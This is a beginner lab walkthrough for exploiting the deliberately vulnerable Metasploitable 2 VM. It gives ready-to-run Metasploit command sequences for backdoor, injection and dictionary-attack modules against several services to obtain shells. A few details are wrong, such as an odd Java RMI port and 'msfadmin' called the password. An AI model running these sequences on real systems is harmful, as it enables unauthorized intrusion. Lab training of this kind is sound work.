@@ -1,0 +1,95 @@
+
+Penetration Testing Skills Practice with Metasploitable (Beginner Guide)
+
+Metasploitable is a voluntarily created vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common vulnerabilities Based virtual machine which helps us to conduct security training, test security tools, and practice common penetration testing techniques. The VM will run on any recent VMware products and other visualization technologies such as VirtualBox. You can download metasploitable from–> https://www.vulnhub.com/entry/metasploitable-2,29/
+Metasploit table is an exploitable framework which help us to improve our skills and also help use to use every port to our advantage as we all know that ports and protocols are the foundation of hacking so, therefore, the more you can take benefit off of the victim.
+In this we will walk through the whole concept of metasploitable including how to install it and how to hack it step by step. We will take all the ports one by one which re vulnerable and try to exploit them. So, firstly you have to download metasploit from the above link. After the downloading is complete open VMware and click on Open a virtual machine.
+
+ Locate the VMware image of metasploitable that you just downloaded and click on OK.
+
+After clicking on OK the metasploitable will open in virtual machine and to run it just click on Power on this virtual machine and it will run your metasploitable.
+
+On the verge of getting started it will ask you for username and password. Now, by default the username and passwords are: msfadmin and msfadmin respectively. Once you enter username and password your metasploitable will start.
+Now that our vulnerable Linux machine is running and now type the ifconfig command to get the IP address
+
+Now for penetration testing on the metasploitable go to the terminal of your Kali Linux and scan the IP of metasploitable through nmap so that we can which ports are open and this type:
+nmap -sV 192.168.1.106
+
+Due to the nmap command we can see which port is open and which service is going on which port, therefore, we can start our attack one by one to every vulnerable port. So, first we will attack on vsftpd2.3.4. As we know that this version is vulnerable, so let us exploit it. For this, open metasploit and type:
+search vsftpd 2.3.4
+
+Typing the above command will show the exploits that will help you in attack the said version. So further type:
+ use exploit/unix/ftp/vsftpd_234_backdoor
+set rhost 192.168.1.106
+set rport 21
+exploit
+
+Once your attack is executed, you will reach in the shell of the metasploitable and so now you can do as you deserve.
+Now, we will exploit ssh which works on port number 22. There is already existing exploit for this port. It will help us to apply dictionary attack to crack the password of metasploitable and so we will use it as :
+use auxiliary/scanner/ssh/ssh_login
+set rhosts 192.168.1.106
+set rport 22
+set user_file /root/Desktop/user.txt
+set pass_file /root/Desktop/pass.txt
+exploit
+
+As you can see, after the execution of the file it will start matching all the username with the passwords to find the correct one. And in the end you will have your password along with the username.
+Now we can use that password to the shell of metasploitable and for this just got to the terminal of Kali and type:
+ssh msfadmin@192.168.1.106
+Here,
+ssh –> is the service through which we are exploiting
+msfadmin –> is the password
+192.168.1.106 –> is the victim’s IP address
+
+Upon execution you can see that you will automatically enter its shell.
+Now, we will try and attack via telnet which works on port 23. This port will also help us to find password first and then we can enter its shell. So, for this type:
+use auxiliary/scanner/telnet/telnet_login
+set rhosts 192.168.1.106
+set rport 23
+set user_file /root/Desktop/user.txt
+set pass_file /root/Desktop/pass.txt
+exploit
+Similarly, as ssh, it will also start dictionary attack and step by step it will find the correct password. Now that you have the password you can log on to metasploitable.
+telnet 192.168.1.106
+After typing so, it will ask you for the username and password and once you enter these you will enter the metasploitable as shown below:
+
+Now we will try to exploit the port number 80 on which http services run. For this too there is a pre-installed exploit in metasploit and to exercise the said exploit type:
+use exploit/multi/http/php_cgi_arg_injection
+set rhost 192.168.1.106
+set rport 80
+exploit
+
+After the execution you will enter a meterpreter session of metasploitable as shown.
+Next we will try to exploit the samba service that is going on the port number 139. For that we will use the following exploit:
+use exploit/multi/samba/usermap_script
+set rhost 192.168.1.106
+set rport 139
+exploit
+
+The execution of this will take you the shell session of metasploit that means you will reach the shell of metasploit.
+Now, we will use the following exploit:
+use exploit/multi/misc/java_rmi_server
+set rhost 192.168.1.106
+set rport 1899
+exploit
+Again, after you hit enter button on your keyboard you will have a meterpreter session.
+The next exploit is:
+use exploit/linux/postgres/postgres_payload
+set rhost 192.168.1.106
+set rport 5432
+exploit
+
+Once the command is executed you will enter the meterpreter session as shown above.
+The exploit that use is related to unreal ircd and to search its exploit type :
+search Unreal ircd
+And the result will be exploits which will help you to attack the victim. As you can see there are three exploits and we will use the latest one.
+
+To the exploit type:
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set rhost 192.168.1.106
+set rport 6667
+exploit
+
+And when you will hit enter you will obtain a shell session meaning you will enter the shell of the metasploitable.
+These are all the attacks that you can use against metasploitable and in the process you can learn how to attack a real life victim using different ports.
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
